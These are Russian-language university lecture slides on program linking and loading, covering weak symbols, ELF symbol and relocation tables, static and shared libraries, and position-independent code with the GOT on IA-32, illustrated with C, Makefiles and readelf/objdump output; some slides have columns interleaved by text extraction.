                                                    © 2024 МГУ/ВМК/СП




           Глобальные переменные

• Следует избегать, если только есть такая
  возможность
• В противном случае
  – Используйте static если это возможно
  – Если определяете глобальную переменную,
    инициализируйте ее
  – Используйте extern если ссылаетесь на внешнюю
    глобальную переменную
  – Используем заголовочные файлы


                                                           17
                                                                                   © 2024 МГУ/ВМК/СП




                  Функции и слабые символы

•   Есть возможность принудительно сделать символ слабым
•   Как от этого может быть польза?
     –   Функции, для которых заводятся слабые символы реализуют алгоритм базовым образом
     –   Специализированная (более эффективная) реализация функции с таким же именем и
         сильным символом «переопределит» базовую реализацию
•   Все ссылки будут вести на реализацию функции с сильным символом, если
    такую реализацию включат в компоновку
int __attribute__((weak)) popcount(unsigned x) {
   int population = 0;
   while (x) {
      population += x & 1;
      x >>= 1;
   }
   return population;
}                                          popcount:
                                              popcnt eax, dword [esp+4]
                                              ret
                                  Только если код программы будет выполняться на
                                  процессоре Intel c поддержкой SSE 4.2 или на            18
                                  процессоре AMD с поддержкой SSE4A
                                                                   © 2024 МГУ/ВМК/СП


extern void func();     hello1.c   #include <stdio.h>            hello2.c

char *buf = "Hello, world!\n";     extern char* buf;

int main() {                       void func() {
  int ret_code = 0;                   printf("%s", buf);
  func();                          }
  return ret_code;
}

all: hello                          Makefile
                                                 hello1.c         hello2.c
hello: hello1.o hello2.o
   gcc -Xlinker -M -o hello hello1.o hello2.o
                                                Трансляторы      Трансляторы
hello1.o: hello1.c                              (cpp, cc1, as)   (cpp, cc1, as)
   gcc -c -o hello1.o hello1.c

hello2.o: hello2.c                               hello1.o          hello2.o
   gcc -c -o hello2.o hello2.c
                                                     Компоновщик (ld)
clean:
                                                                          19
   rm -f hello hello1.o hello2.o
                                                           hello
                                          © 2024 МГУ/ВМК/СП

extern void func();     hello1.c

char *buf = "Hello, world!\n";

int main() {
  int ret_code = 0;
  func();
  return ret_code;
}

snoop@earth:~/samples/2014$ nm hello1.o
00000000 D buf
         U func
00000000 T main




                                                 20
                                                                                      © 2024 МГУ/ВМК/СП

extern void func();        hello1.c
char *buf = "Hello, world!\n";
                                 typedef struct {
                                    int name;      /* Смещение в таблице строк */
int main() {                        int value;     /* Смещение в секции или виртуальный адрес */
                                    int size;      /* Размер в байтах */
  int ret_code = 0;                 char type:4,   /* Данные, код, секция, имя файла */
  func();                           binding:4;     /* Локальный или глобальный символ */
                                    char reserved; /* Не используется */
  return ret_code;                  char section; /* Номер заголовка секции, ABS, UNDEF, COMMON */
                                 } Elf_Symbol;
}
   snoop@earth:~/samples/2014$ readelf –s hello1.o

   Symbol table '.symtab' contains 11 entries:
      Num:    Value Size Type     Bind   Vis               Ndx Name
        0: 00000000     0 NOTYPE LOCAL DEFAULT             UND
        1: 00000000     0 FILE    LOCAL DEFAULT            ABS hello1.c
        2: 00000000     0 SECTION LOCAL DEFAULT              1
        3: 00000000     0 SECTION LOCAL DEFAULT              3
        4: 00000000     0 SECTION LOCAL DEFAULT              5
        5: 00000000     0 SECTION LOCAL DEFAULT              6
        6: 00000000     0 SECTION LOCAL DEFAULT              8
        7: 00000000     0 SECTION LOCAL DEFAULT              7
        8: 00000000     4 OBJECT GLOBAL DEFAULT              3 buf
        9: 00000000    28 FUNC    GLOBAL DEFAULT             1 main
       10: 00000000     0 NOTYPE GLOBAL DEFAULT            UND func
                                                                                             21
                                                                                     © 2024 МГУ/ВМК/СП

extern void func();        hello1.c

char *buf = "Hello, world!\n";
                                  typedef struct {
                                     int offset;    /* Смещение перебазируемой ссылки в секции */
int main() {                         int symbol:24, /* Номер символа в таблице */
                                     type:8;        /* Тип перебазирования */
  int ret_code = 0;               } Elf32_Rel;
  func();
  return ret_code;                typedef struct {                Объявление типа данных из
                                     Elf32_Addr      r_offset;    официальной документации
}                                    Elf32_Word      r_info;
                                  } Elf32_Rel;

snoop@earth:~/samples/2014$ readelf -r hello1.o

Relocation section '.rel.text' at offset 0x388 contains 1 entries:
 Offset     Info    Type            Sym.Value Sym. Name
00000012 00000a02 R_386_PC32         00000000   func

Relocation section '.rel.data' at offset 0x390 contains 1 entries:
 Offset     Info    Type            Sym.Value Sym. Name
00000000 00000501 R_386_32           00000000   .rodata


Что будет, если   ...
поменять код?     char buf[] = "Hello, world!\n";                                             22
                  ...
                                                                           © 2024 МГУ/ВМК/СП

Напоминание
Диалект Intel-синтаксиса, который используют программы binutils,
отличается от диалекта, поддерживаемого nasm.

snoop@earth:~/samples/2014$ objdump -M intel -dr hello1.o
                                                      snoop@earth:~/samples/2014$ readel
hello1.o:        file format elf32-i386
                                                      Relocation section '.rel.text' at
                                                       Offset     Info    Type
                                                      00000012 00000a02 R_386_PC32
Disassembly of section .text:
                                                      Relocation section '.rel.data' at
                                                       Offset     Info    Type
00000000 <main>:
                                                      00000000 00000501 R_386_32
   0:   55                      push  ebp
   1:   89 e5                   mov   ebp,esp
   3:   83 e4 f0                and   esp,0xfffffff0
   6:   83 ec 10                sub   esp,0x10
   9:   c7 44 24 0c 00 00 00    mov   DWORD PTR [esp+0xc],0x0
  10:   00
  11:   e8 fc ff ff ff          call  12 <main+0x12>
                        12: R_386_PC32 func
  16:   8b 44 24 0c             mov   eax,DWORD PTR [esp+0xc]
  1a:   c9                      leave
  1b:   c3                      ret                                               23
                                                                             © 2024 МГУ/ВМК/СП



snoop@earth:~/samples/2014$ objdump -s -j .data hello1.o

hello1.o:        file format elf32-i386

Contents of section .data:
 0000 00000000                                        ....


snoop@earth:~/samples/2014$ objdump -s -j .rodata hello1.o

hello1.o:        file format elf32-i386

Contents of section .rodata:
 0000 48656c6c 6f2c2077 6f726c64 210a00               Hello, world!..

            snoop@earth:~/samples/2014$ readelf -r hello1.o

            Relocation section '.rel.text' at offset 0x388 contains 1 entries:
             Offset     Info    Type            Sym.Value Sym. Name
            00000012 00000a02 R_386_PC32         00000000   func

            Relocation section '.rel.data' at offset 0x390 contains 1 entries:
             Offset     Info    Type            Sym.Value Sym. Name
                                                                                    24
            00000000 00000501 R_386_32           00000000   .rodata
                                          © 2024 МГУ/ВМК/СП

#include <stdio.h>      hello2.c

extern char* buf;

void func() {
   printf("%s", buf);
}




snoop@earth:~/samples/2014$ nm hello2.o
         U buf
00000000 T func
         U printf




                                                 25
                                                             © 2024 МГУ/ВМК/СП

#include <stdio.h>      hello2.c

extern char* buf;

void func() {
   printf("%s", buf);
}

  snoop@earth:~/samples/2014$ readelf -s hello2.o

  Symbol table '.symtab' contains 11 entries:
     Num:    Value Size Type     Bind   Vis       Ndx Name
       0: 00000000     0 NOTYPE LOCAL DEFAULT     UND
       1: 00000000     0 FILE    LOCAL DEFAULT    ABS hello2.c
       2: 00000000     0 SECTION LOCAL DEFAULT      1
       3: 00000000     0 SECTION LOCAL DEFAULT      3
       4: 00000000     0 SECTION LOCAL DEFAULT      4
       5: 00000000     0 SECTION LOCAL DEFAULT      5
       6: 00000000     0 SECTION LOCAL DEFAULT      7
       7: 00000000     0 SECTION LOCAL DEFAULT      6
       8: 00000000    31 FUNC    GLOBAL DEFAULT     1 func
       9: 00000000     0 NOTYPE GLOBAL DEFAULT    UND buf
      10: 00000000     0 NOTYPE GLOBAL DEFAULT    UND printf        26
                                                             © 2024 МГУ/ВМК/СП

#include <stdio.h>      hello2.c

extern char* buf;

void func() {
   printf("%s", buf);
}



snoop@earth:~/samples/2014$ readelf -r hello2.o

Relocation section '.rel.text' at offset 0x354 contains 3 entries:
 Offset     Info    Type            Sym.Value Sym. Name
00000008 00000901 R_386_32           00000000   buf
0000000d 00000501 R_386_32           00000000   .rodata
00000019 00000a02 R_386_PC32         00000000   printf




                                                                    27
                                                                   © 2024 МГУ/ВМК/СП


snoop@earth:~/samples/2014$ objdump -M intel -dr hello2.o

hello2.o:    file format elf32-i386   snoop@earth:~/samples/2014$ readelf -r hell

                                      Relocation section '.rel.text' at offset 0x
                                       Offset     Info    Type            Sym.Val
Disassembly of section .text:         00000008 00000901 R_386_32           000000
                                      0000000d 00000501 R_386_32           000000
                                      00000019 00000a02 R_386_PC32         000000
00000000 <func>:
   0:   55                      push  ebp
   1:   89 e5                   mov   ebp,esp
   3:   83 ec 18                sub   esp,0x18
   6:   8b 15 00 00 00 00       mov   edx,DWORD PTR ds:0x0
                        8: R_386_32    buf
   c:   b8 00 00 00 00          mov   eax,0x0
                        d: R_386_32    .rodata
  11:   89 54 24 04             mov   DWORD PTR [esp+0x4],edx
  15:   89 04 24                mov   DWORD PTR [esp],eax
  18:   e8 fc ff ff ff          call  19 <func+0x19>
                        19: R_386_PC32 printf
  1d:   c9                      leave
  1e:   c3                      ret
                                                                          28
                                                                    © 2024 МГУ/ВМК/СП

snoop@earth:~/samples/2014$ gcc -Xlinker -M -o hello hello1.o hello2.o
...
 .text          0x00000000080483e4       0x1c hello1.o
                0x00000000080483e4                main
 .text          0x0000000008048400       0x1f hello2.o
                0x0000000008048400                func
...
 .rodata        0x00000000080484e0        0xf hello1.o
 .rodata        0x00000000080484ef        0x3 hello2.o
...
 .data          0x000000000804a014        0x4 hello1.o
                0x000000000804a014                buf
 .data          0x000000000804a018        0x0 hello2.o


snoop@earth:~/samples/2014$ nm hello1.o
00000000 D buf
         U func             snoop@earth:~/samples/2014$ nm hello2.o
00000000 T main                      U buf
                            00000000 T func
                                     U printf

Стандартная
библиотека языка Си
                                                                           29
printf.o
                                                                    © 2024 МГУ/ВМК/СП

snoop@earth:~/samples/2014$ gcc -Xlinker -M -o hello hello1.o hello2.o
...
 .text          0x00000000080483e4       0x1c hello1.o
                0x00000000080483e4                main
 .text          0x0000000008048400       0x1f hello2.o
                0x0000000008048400                func
...
 .rodata        0x00000000080484e0        0xf hello1.o
 .rodata        0x00000000080484ef        0x3 hello2.o
...
 .data          0x000000000804a014        0x4 hello1.o
                0x000000000804a014                buf
 .data          0x000000000804a018        0x0 hello2.o

  • Правила пересчета для значений ссылок
      – Тип перебазирования R_386_32
        новое значение ссылки = S + A
      – Тип перебазирования R_386_PC32
        новое значение ссылки = S + A – P
  • S – абсолютный адрес памяти, которому символ соответствует
    после перемещения
  • A – дополнительное слагаемое (addend), хранимое
    непосредственно в байтах ссылки
                                                              30
  • P – абсолютный адрес ссылки
                                                                    © 2024 МГУ/ВМК/СП

snoop@earth:~/samples/2014$ objdump -s -j .data hello

hello:     file format elf32-i386

Contents of section .data:
 804a00c 00000000 00000000 e0840408          ............

snoop@earth:~/samples/2014$ objdump -d –M intel -s -j .text hello
...
080483e4 <main>:
 80483e4:       55                      push   ebp
 80483e5:       89 e5                   mov    ebp,esp
 80483e7:       83 e4 f0                and    esp,0xfffffff0
 80483ea:       83 ec 10                sub    esp,0x10
 80483ed:       c7 44 24 0c 00 00 00    mov    DWORD PTR [esp+0xc],0x0
 80483f4:       00
 80483f5:       e8 06 00 00 00          call   8048400 <func>
 80483fa:       8b 44 24 0c             mov    eax,DWORD PTR [esp+0xc]
 80483fe:       c9                      leave
 80483ff:       c3                      ret



            Как изменились ссылки, попавшие в
            исполняемый код из файла hello1.o?
                                                                           31
              © 2024 МГУ/ВМК/СП




Лекция 0x12


 17 апреля
                                                           © 2024 МГУ/ВМК/СП




          Работа с общими функциями

• Как следует размещать функции, часто используемые
  разными программами?
  – Математика, I/O, управление памятью, работа со строками,
    и т.д.


• Исходя из порядка компоновки:
  – Вариант 1: Поместить все функции в один файл
     • Компонуемся с одним большим объектным файлом
     • Неэффективно
  – Вариант 2: Поместить каждую функцию в отдельный файл
     • Во время компоновки явно указываем нужные объектные файлы
     • Более эффективно, но крайне неудобно для программиста

                                                                   2
                                                    © 2024 МГУ/ВМК/СП




       Решение: статические библиотеки

• Статические библиотеки (.a – файлы-архивы)
  – Близкие по смыслу перемещаемые объектные файлы
    группируются в одном файле, в т.н. называемом архиве.

  – Компоновщику указывают набор архивов для того, чтоб
    он попытался найти в них код с недостающими
    символами.

  – Если содержащийся в архиве файл помогает разрешить
    символ, то его автоматически включают в компоновку.


                                                            3
                                                                   © 2024 МГУ/ВМК/СП




                 Создание статической библиотеки

     atoi.c        printf.c            random.c

    Транслятор     Транслятор    ...   Транслятор


      atoi.o       printf.o            random.o


                                           unix> ar rs libc.a \
                   Библиотекарь (ar)
                                             atoi.o printf.o … random.o


                    libc.a       Стандартная библиотека Си


    Библиотекарь позволяет выполнять инкрементальное обновление
    Повторная компиляция функции и замена соответствующего o-файла в
     библиотеке.                                                    4
                                                                  © 2024 МГУ/ВМК/СП


           Часто используемые библиотеки
libc.a (Стандартная библиотека Си)
   – 8 МБ архив из 1392 объектных файлов.
   – I/O, управление памятью, работа со строками, даты и время,
     случайные числа, целочисленные математические функции
libm.a (Математическая библиотека Си)
   – 1 МБ архив из 401 объектных файлов.
   – Математические функции над числами с плавающей точкой (sin,
     cos, tan, log, exp, sqrt, …)
% ar -t /usr/lib/libc.a | sort       % ar -t /usr/lib/libm.a | sort
…                                    …
fork.o                               e_acos.o
…                                    e_acosf.o
fprintf.o                            e_acosh.o
fpu_control.o                        e_acoshf.o
fputc.o                              e_acoshl.o
freopen.o                            e_acosl.o
fscanf.o                             e_asin.o
fseek.o                              e_asinf.o
fstab.o                              e_asinl.o
…                                    …                                    5
                                                                   © 2024 МГУ/ВМК/СП



     Компоновка со статическими библиотеками
                            stdio.h
                   hello2.c        hello.h   a64l.o ... xstat.o


                         Трансляторы            Библиотекарь
hello1.c   hello.h
                        (cpp, cc1, as)              (ar)

   Трансляторы
  (cpp, cc1, as)                                   libc.a      Статическая
                            hello2.o                           библиотека

           hello1.o          printf.o          … и все остальные
Перемещаемые                                   модули, вызываемые из
объектные                                      printf.o
                    Компоновщик (ld)
файлы


                            hello-stat
                                   Полностью скомпонованный
                                   исполняемый файл                        6
                                                              © 2024 МГУ/ВМК/СП




       Использование статических библиотек
• Алгоритм компоновщика для разрешения внешних ссылок :
   – Просматриваем .o файлы и .a файлы в порядке их следования в
     командной строке.
   – В процессе просмотра, поддерживаем список неразрешенных в
     данный момент символов.
   – Как только появляется новый .o или .a файл, пытаемся разрешить
     каждый еще неразрешенный символ среди символов,
     определенных в найденном файле.
   – Ошибка линковки, если по окончании просмотра остался хоть один
     неразрешенный символ.
• Проблема:
   – Важен порядок объектных файлов в командной строке!
   – Решение: помещать все библиотеки в конец командной строки.
    unix> gcc -L. libtest.o -lmine
    unix> gcc -L. -lmine libtest.o
    libtest.o: In function `main':                                    7
    libtest.o(.text+0x4): undefined reference to `libfun'
                                                                              © 2024 МГУ/ВМК/СП




      Загрузка исполняемого объектного файла

   • Подготовка адресного пространства для запускаемой программы
   • Просмотр у заданного файла таблицы заголовков сегментов
      – Для каждого сегмента типа LOAD загружаем указанные байты из файла на
        указанные адреса памяти
                                                                  typedef struct {
   • Передаем управление на точку входа в программу                  …
      – … на символ _start …                                         Elf32_Addr e_entry;
                                                                     …
      – На самом деле – на адрес, указанный заголовке elf-файла   } Elf32_Ehdr;
        символ _start соответствует этому адресу

typedef struct {
   Elf32_Word p_type;   /* LOAD, DYNAMIC, INTERP, PHDR, NULL, ... */
   Elf32_Off p_offset; /* Смещение от начала файла */
   Elf32_Addr p_vaddr; /* Начальный (базовый) адрес в памяти */
   Elf32_Addr p_paddr; /* Не используется */
   Elf32_Word p_filesz; /* Размер в файле в байтах */
   Elf32_Word p_memsz; /* Размер в памяти в байтах */
   Elf32_Word p_flags; /* R/W/X */
   Elf32_Word p_align; /* Величина выравнивания*/
                                                                   8
} Elf32_Phdr;
                                                                 © 2024 МГУ/ВМК/СП




                  Связь секций и сегментов
snoop@jezek:~/samples/2017/linking$ readelf -l hello-static

Elf file type is EXEC (Executable file)
Entry point 0x8048a8d
There are 6 program headers, starting at offset 52

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz Flg Align
  LOAD           0x000000 0x08048000 0x08048000 0xa3a31 0xa3a31 R E 0x1000
  LOAD           0x0a3f3c 0x080ecf3c 0x080ecf3c 0x01124 0x02608 RW 0x1000
  NOTE           0x0000f4 0x080480f4 0x080480f4 0x00044 0x00044 R   0x4
  TLS            0x0a3f3c 0x080ecf3c 0x080ecf3c 0x00010 0x00028 R   0x4
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW 0x10
  GNU_RELRO      0x0a3f3c 0x080ecf3c 0x080ecf3c 0x000c4 0x000c4 R   0x1

Section to Segment mapping:
 Segment Sections...
  00     ... .init .text .fini .rodata ...
  01     ... .init_array .fini_array .data .bss
                                                                         9
                                                                                    © 2024 МГУ/ВМК/СП




      Загрузка исполняемого объектного файла
Исполняемый объектный файл
                               0                         Память ядра ОС
       ELF заголовок               0x80000000
                                                      Пользовательский стек
Таблица заголовков сегментов                                                        esp
                                                                                    (указатель
           .init                                                                    стека)
           .text                                    Область для динамических
         .rodata                                            библиотек
                                    0x0f7e9ddc
           .data
           .bss                                                                      brk
         .symtab                                              «Куча»
                                                             (malloc)
          .debug
                                                      Сегмент чтение/запись        Загружены из
           .line                                                                   исполняемого
                                                         (.data, .bss, ...)        файла
                                   0x080ecf3c
         .strtab                                    Сегмент чтение/выполнение
                                                    (.init, .text, .rodata, ...)
 Таблица заголовков секций         0x08048000
                                                                                           10
                                                          Не используется
                                                0
                                                                                                 © 2024 МГУ/ВМК/СП




           Динамические (разделяемые) библиотеки
    • Статические библиотеки имеют следующие недостатки:
           – Многократное копирование кода в построенных исполняемых файлах
             (всем нужно std libc)
           – Копии кода в исполняющихся программах
           – Любое исправление в системных библиотеках требует повторной
             компоновки для всех приложений

   student@pc:~/asm/linking$ gcc -m32 -static -o hello-static hello1.o hello2.o
   student@pc:~/asm/linking$ gcc -m32 -o hello hello1.o hello2.o
   student@pc:~/asm/linking$ ls -l hello-static hello
   -rwxr-xr-x 1 student student   7248 апр 14 13:57 hello
   -rwxr-xr-x 1 student student 657672 апр 14 13:57 hello-static

    • Способ преодолеть эти недостатки: динамические библиотеки
      (shared libraries)
           – Объектные файлы, в которых содержатся код и данные компонуются с
             приложением динамически, либо во время загрузки, либо во время
             выполнения
           – Практикуются сленговые названия: DLL-ки и .so-шники
                                                                                                        11
Drepper U. How To Write Shared Libraries. — 2011. https://www.akkadia.org/drepper/dsohowto.pdf
                                                            © 2024 МГУ/ВМК/СП




   Динамические (разделяемые) библиотеки
• Динамическая компоновка происходит при запуске
  программы, когда исполняемый файл загружается и
  начинает работать (компоновка во время загрузки).
   – В Linux наиболее распространено, автоматически выполняется
     динамическим компоновщиком (ld-linux.so).
   – Стандартная библиотека языка Си (libc.so) обычно компонуется
     динамически.
• Динамическая компоновка может происходить когда
  программа уже работает (динамическая загрузка
  библиотек).
                 #include <dlfcn.h>
                 void *dlopen(const char *filename, int flag);

• Функции размещенных в памяти динамических библиотек
  могут одновременно использоваться несколькими
  процессами (работающими программами).             12
                                                                    © 2024 МГУ/ВМК/СП




                           Проблемы

• Динамическая библиотека может быть размещена в
  произвольном месте памяти
• Как обращаться из основной программы к переменным и
  функциям, размещение которых в памяти будет известно
  только в момент запуска программы?
   – До момента компоновки неизвестно, куда ведет ссылка – в
     перемещаемый код другой единицы трансляции или в
     динамическую библиотеку
   – Перемещаемый код с ссылками уже построен, в нем могут
     меняться только значения операндов (перебазируемые ссылки)
      • В случае динамической загрузки, адреса размещения будут определены
        еще позже – в уже работающей программе
• Как строить код динамической библиотеки, когда до
  момента начала выполнения ее кода неизвестно, по
  каким адресам будут размещены ее собственные функции
  и данные
                                                                           13
                                                                                     © 2024 МГУ/ВМК/СП
OBJS = hello-dlib hello-static libhello.so hello                        Makefile
CFLAGS = -m32 -O3 -D_FORTIFY_SOURCE=0 -fno-asynchronous-unwind-tables

all: $(OBJS)

hello-dlib: hello1.o libhello.so
        gcc -m32 -o hello-dlib hello1.o libhello.so          extern void f();         hello.h
libhello.so: hello2_pic.o
        gcc -m32 -shared -o libhello.so hello2_pic.o         extern char* buf;

hello2_pic.s: hello.h hello2.c
        gcc -S -masm=intel $(CFLAGS) -fPIC -o hello2_pic.s hello2.c
                                                            #include "hello.h"       hello1.c
hello2_pic.o: hello2_pic.s
        gcc -c $(CFLAGS) -o hello2_pic.o hello2_pic.s
                                                            char *buf = "Hello, world!\n";
hello1.o: hello.h hello1.c
        gcc -c $(CFLAGS) -fno-PIC -o hello1.o hello1.c      int main() {
                                                              int ret_code = 0;
hello2.o: hello.h hello2.c                                    f();
        gcc -c $(CFLAGS) -fno-PIC -o hello2.o hello2.c        return ret_code;
hello-static: hello.h hello1.o hello2.o
                                                            }
        gcc $(CFLAGS) -static -fno-PIC -no-pie -o hello-static hello1.o hello2.o

hello: hello.h hello1.c hello2.c
        gcc $(CFLAGS) -o hello hello1.c hello2.c            #include <stdio.h>       hello2.c
                                                            #include "hello.h"
clean:
         rm -f $(OBJS) hello2_pic.s                         void f() {
                                                               printf("%s", buf);
gcc version 7.5.0                                           }                                14
                                                                             © 2024 МГУ/ВМК/СП




      Динамическая компоновка времени загрузки
                   hello1.c     hello.h     hello2.c   hello.h


                          Трансляторы            Трансляторы
                         (cpp, cc1, as)         (cpp, cc1, as)
                                                                   Перемещаемый
     Перемещаемый                                                      позиционно
    объектный файл         hello1.o             hello2_pic.o         независимый
                                                                  объектный файл
                         Компоновщик (ld)      Компоновщик (ld)
              Частично                                                    Динамические
        скомпонованный                                                       библиотеки
                         hello-dlib              libhello.so, libc.so, …
исполняемый объектный                                                      (разделяемые
                  файл                                                объектные файлы)

                         Загрузчик ОС
                           (execve)


          Полностью
     скомпонованный       Динамический компоновщик
   исполняемый код в                                                                15
                               (ld-linux.so)
             памяти
                                                                                © 2024 МГУ/ВМК/СП




       Позиционно независимый код в IA-32

• Абсолютные адреса неизвестны, но известны смещения.
   –   Можно обращаться к функциям своего модуля.
   –   В IA-32 нет возможности обратиться к данным по смещению относительного текущего
       значения счетчика команд. Такая возможность появится в x86_64.
• Код и данные размещаются в памяти друг за другом, в сегмент данных
  входит служебная таблица – Global Offset Table (GOT).
• GOT содержит указатели (абсолютные адреса) на внешние функции и
  переменные. Их адреса становятся известны не ранее этапа
  динамической компоновки при запуске программы.
• Динамический компоновщик заполняет GOT необходимыми значениями.




                                                                                         16
                                                                     © 2024 МГУ/ВМК/СП



            Как заставить ассемблер построить
              позиционно независимый код?
extern void f();         hello.h      #include <stdio.h>           hello2.c
                                      #include "hello.h"
extern char* buf;
                                      void f() {
f:                                       printf("%s", buf);
     push    ebx                      }              Синтаксис ассемблера gas
     call    __x86.get_pc_thunk.bx                оставлен без изменений.
     add     ebx, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_
     sub     esp, 16                     Определенные ключевые
     mov     eax, DWORD PTR buf@GOT[ebx] слова указывают ассемблеру
     push    DWORD PTR [eax]             на необходимость создания
     lea     eax, .LC0@GOTOFF[ebx]       ссылок типа R_386_GOTPC,
     push    eax                         R_386_GOT32, R_386_GOTOFF,
     call    printf@PLT                  R_386_PLT
     add     esp, 24
     pop     ebx
     ret                                                                    17
                                                                © 2024 МГУ/ВМК/СП

snoop@jezek:~/samples/2017/linking$ objdump -d -r -M intel hello2_pic.o
hello2_pic.o:     file format elf32-i386
                                         Как обратиться к данным по
                                         __x86.get_pc_thunk.bx:
                                         известному
                                            mov ebx,смещению
                                                     dword [esp]
Disassembly of section .text:            относительно
                                            ret       счетчика команд,
                                          если это не x86_64?
00000000 <f>:
   0:   53                     push   ebx
   1:   e8 fc ff ff ff         call   2 <f+0x2>
                       2: R_386_PC32   __x86.get_pc_thunk.bx
  6:   81 c3 02 00 00 00       add    ebx,0x2
                       8: R_386_GOTPC _GLOBAL_OFFSET_TABLE_
  c:   83 ec 10                sub    esp,0x10
  f:   8b 83 00 00 00 00       mov    eax,DWORD PTR [ebx+0x0]
                       11: R_386_GOT32Х buf
 15:   ff 30                   push   DWORD PTR [eax]
 17:   8d 83 00 00 00 00       lea    eax,[ebx+0x0]
                       19: R_386_GOTOFF         .LC0
 1d:   50                      push   eax
 1e:   e8 fc ff ff ff          call   1f <f+0x1f>
                       1f: R_386_PLT32 printf
 23:   83 c4 18                add    esp,0x18
 26:   5b                      pop    ebx                              18
 27:   c3                      ret
                                                                        © 2024 МГУ/ВМК/СП

snoop@jezek:~/samples/2017/linking$ objdump -d -r -M intel hello2_pic.o
hello2_pic.o:     file format elf32-i386


Disassembly of section .text:

00000000 <f>:
   0:   53                        push     ebx
   1:   e8 fc ff ff ff            call     2 <f+0x2>
                        2: R_386_PC32        __x86.get_pc_thunk.bx
  6:   81 c3 02 00 00 00          add      ebx,0x2
                        8: R_386_GOTPC _GLOBAL_OFFSET_TABLE_
  c:   83 ec 10                   sub
                     • Тип перебазирования esp,0x10
                                                  R_386_GOTPC
  f:   8b 83 00 00 00 00новое значение
                                  mov      ссылки
                                           eax,DWORD = GOT     A–P
                                                         PTR +[ebx+0x0]
                        11: –R_386_GOT32
                     • GOT                   buf памяти, связанный с некоторым
                               абсолютный адрес
 15:   ff 30            элементомpush
                                   глобальной
                                           DWORDтаблицы   смещений
                                                    PTR [eax]
 17:   8d 83 00 00 00• 00
                        A – дополнительное
                                  lea        слагаемое (addend), хранимое
                                           eax,[ebx+0x0]
                        непосредственно
                        19: R_386_GOTOFF  в байтах ссылки
                                                        .LC0
 1d:   50            •  P – абсолютный
                                  push  адрес
                                           eax ссылки
 1e:   e8 fc ff ff ff• Наличие   такого
                                  call  типа1fперебазирования
                                                <func+0x1f>
                        компоновщика создавать GOT
                                                                в файле требует от
                        1f: R_386_PLT32
                     • Новое                 printf
                               значение ссылки   – расстояние до GOT. После
 23:   83 c4 18                   add будетesp,0x18
                        сложения EBX         указывать на некоторый элемент GOT.
 26:   5b                         pop      ebx                                19
 27:   c3                         ret
                                                                 © 2024 МГУ/ВМК/СП

snoop@jezek:~/samples/2017/linking$ objdump -d -r -M intel hello2_pic.o
hello2_pic.o:     file format
                         • Типelf32-i386
                                 перебазирования R_386_GOT32
                             новое значение ссылки = G + A
                          • G – смещение в GOT, по которому должен быть
Disassembly of section .text:размещен адрес символа
                          • A – дополнительное слагаемое (addend),
00000000 <f>:                хранимое непосредственно в байтах ссылки
   0:   53                       pushтакого
                          • Наличие      ebxтипа перебазирования в файле
   1:   e8 fc ff ff ff       требует
                                 callот компоновщика
                                         2 <func+0x2> создавать GOT
                        2:• R_386_PC32    __x86.get_pc_thunk.bx
                             Новое значение  ссылки – смещение от базового
   6:   81 c3 02 00 00 00    адреса
                                 add_GLOBAL_OFFSET_TABLE_
                                         ebx,0x2            до
                             необходимого_GLOBAL_OFFSET_TABLE_
                        8: R_386_GOTPC     элемента
   c:   83 ec 10                sub    esp,0x10
   f:   8b 83 00 00 00 00       mov    eax,DWORD PTR [ebx+0x0]
                        11: R_386_GOT32 buf
  15:   ff 30                   push   DWORD PTR [eax]
  17:   8d 83 00 00 00 00       lea    eax,[ebx+0x0]
                        19: R_386_GOTOFF        .LC0
  1d:   50                      push   eax
  1e:   e8 fc ff ff ff          call   1f <f+0x1f>
                        1f: R_386_PLT32 printf
  23:   83 c4 18                add    esp,0x18
  26:   5b                      pop    ebx                              20
  27:   c3                      ret
                                                                 © 2024 МГУ/ВМК/СП

snoop@jezek:~/samples/2017/linking$ objdump -d -r -M intel hello2_pic.o
hello2_pic.o:     file format
                         • Типelf32-i386
                                 перебазирования R_386_GOTOFF
                             новое значение ссылки = S + A – GOT
                          • S – абсолютный адрес памяти, которому
Disassembly of section .text:символ соответствует после перемещения
                          • GOT – абсолютный адрес памяти, связанный с
00000000 <f>:                некоторым элементом глобальной таблицы
   0:   53                   смещений
                                 push    ebx
   1:   e8 fc ff ff ff    • A – дополнительное
                                 call            слагаемое (addend),
                                         2 <func+0x2>
                             хранимое непосредственно
                        2: R_386_PC32                    в байтах ссылки
                                          __x86.get_pc_thunk.bx
   6:   81 c3 02 00 00 00 • Наличие
                                 add такого типа перебазирования в файле
                                         ebx,0x2
                             требует от компоновщика
                        8: R_386_GOTPC                 создавать GOT
                                          _GLOBAL_OFFSET_TABLE_
   c:   83 ec 10          • Новое  значение
                                 sub         ссылки – смещение от базового
                                         esp,0x10
   f:   8b 83 00 00 00 00    адреса
                                 mov_GLOBAL_OFFSET_TABLE_     до адреса
                                         eax,DWORD PTR [ebx+0x0]
                             символа
                        11: R_386_GOT32   buf
  15:   ff 30                   push   DWORD PTR [eax]
  17:   8d 83 00 00 00 00       lea    eax,[ebx+0x0]
                        19: R_386_GOTOFF        .LC0
  1d:   50                      push   eax
  1e:   e8 fc ff ff ff          call   1f <f+0x1f>
                        1f: R_386_PLT32 printf
  23:   83 c4 18                add    esp,0x18
  26:   5b                      pop    ebx                              21
  27:   c3                      ret
                                                                   © 2024 МГУ/ВМК/СП

noop@jezek:~/samples/2017/linking$ objdump -d -M intel libhello.so
...                                                  Расстояние до GOT
000004b0 <f>:
 4b0: 53                     push   ebx            Смещение от GOT до
 4b1: e8 fa fe ff ff         call   3b0 <__x86.get_pc_thunk.bx>
                                                   элемента, соответствующего
 4b6: 81 c3 4a 1b 00 00      add    ebx,0x1b4a     указателю на buf
 4bc: 83 ec 10               sub    esp,0x10
 4bf: 8b 83 f8 ff ff ff      mov    eax,DWORD PTR [ebx-0x8]
 4c5: ff 30                  push   DWORD PTR [eax]
 4c7: 8d 83 ec e4 ff ff      lea    eax,[ebx-0x1b14]
 4cd: 50                     push   eax
 4ce: e8 bd fe ff ff         call   390 <printf@plt>
 4d3: 83 c4 18               add    esp,0x18      Смещение от GOT до места в
 4d6: 5b                     pop    ebx           памяти, где размещена
 4d7: c3                     ret                  строка .LC0

 • Компоновщик создает GOT
 • Все ссылки в коде обновляются
 • Создается секция .dynsym, в которой собраны описания
   символов, используемых в динамической компоновке
 • Создается секция .rel.dyn, в которой собраны описания
   новых ссылок, размещенных в GOT                                        22
                                                                        © 2024 МГУ/ВМК/СП

